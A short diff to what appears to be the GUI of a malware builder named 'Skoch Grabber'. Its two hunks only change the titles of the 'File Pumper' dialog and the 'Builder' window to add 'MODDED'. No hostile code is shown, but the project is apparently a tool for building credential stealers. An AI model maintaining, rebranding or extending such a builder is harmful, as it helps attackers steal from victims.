@@ -594,7 +594,7 @@ class PumperSettings(ctk.CTkToplevel):
 
 	def __init__(self, master) -> None:
 		super().__init__(master)
-		self.title("Skoch Grabber [File Pumper]")
+		self.title("Skoch Grabber MODDED [File Pumper]")
 		self.after(200, lambda: self.iconbitmap(os.path.join("Extras", "icon.ico")))
 		self.grab_set()
 		self.geometry("500x200")
@@ -734,7 +734,7 @@ class Builder(ctk.CTk):
 		super().__init__()
 
 		ctk.set_appearance_mode("dark")
-		self.title("Skoch Grabber [Builder]")
+		self.title("Skoch Grabber MODDED [Builder]")
 		self.iconbitmap(os.path.join("Extras", "icon.ico"))
 		self.geometry("1250x600")
 		self.resizable(False, False)
